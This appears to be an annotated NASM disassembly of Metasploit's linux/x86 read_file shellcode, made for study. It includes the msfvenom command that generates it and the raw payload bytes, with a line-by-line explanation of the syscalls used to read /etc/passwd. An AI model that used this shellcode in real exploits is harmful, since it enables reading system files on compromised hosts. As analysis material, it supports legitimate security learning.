; Generated from msfvenom:
; ▶ msfvenom --arch x86 --platform linux -p linux/x86/read_file PATH=/etc/passwd -f sh
; No encoder specified, outputting raw payload
; Payload size: 73 bytes
; Final size of sh file: 334 bytes
; export buf=\
; $'\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3'\
; $'\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00'\
; $'\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00'\
; $'\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80'\
; $'\xe8\xc5\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73'\
; $'\x77\x64\x00'
; echo -ne $buf | ndisasm -u - > msf_read_file.nasm
;
; one-liner: \xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00

global _start

section .text

_start:
  jmp short 0x38  ; 00000000  EB36         ; jump to call 0x2
  mov eax,0x5     ; 00000002  B805000000   ; open(2)
  pop ebx         ; 00000007  5B           ; address of "/etc/passwd\x00"
  xor ecx,ecx     ; 00000008  31C9         ; clear ecx
  int 0x80        ; 0000000A  CD80         ; syscall open("/etc/passwd\x00", NULL)

  mov ebx,eax     ; 0000000C  89C3         ; ebx = fd
  mov eax,0x3     ; 0000000E  B803000000   ; read(2)
  mov edi,esp     ; 00000013  89E7         ; edi = esp
  mov ecx,edi     ; 00000015  89F9         ; ecx = esp address
  mov edx,0x1000  ; 00000017  BA00100000   ; edx = 4096
  int 0x80        ; 0000001C  CD80         ; syscall read(fd, "/etc/passwd\x00", 4096)

  mov edx,eax     ; 0000001E  89C2         ; edx = read size
  mov eax,0x4     ; 00000020  B804000000   ; write(2)
  mov ebx,0x1     ; 00000025  BB01000000   ; fd = stdout
  int 0x80        ; 0000002A  CD80         ; syscall write(stdout, "/etc/passwd\x00", read_size)

  mov eax,0x1     ; 0000002C  B801000000   ; _exit(2)
  mov ebx,0x0     ; 00000031  BB00000000   ; clear ebx
  int 0x80        ; 00000036  CD80         ; syscall _exit
  call 0x2        ; 00000038  E8C5FFFFFF   ; jump to mov eax,0x5 and push "/etc/passwd\x00" address into stack

  das             ; 0000003D  2F           ; 3D-48 = "/etc/passwd\x00"
  gs jz 0xa4      ; 0000003E  657463
  das             ; 00000041  2F
  jo 0xa5         ; 00000042  7061
  jnc 0xb9        ; 00000044  7373
  ja 0xac         ; 00000046  7764
  db 0x00         ; 00000048  00
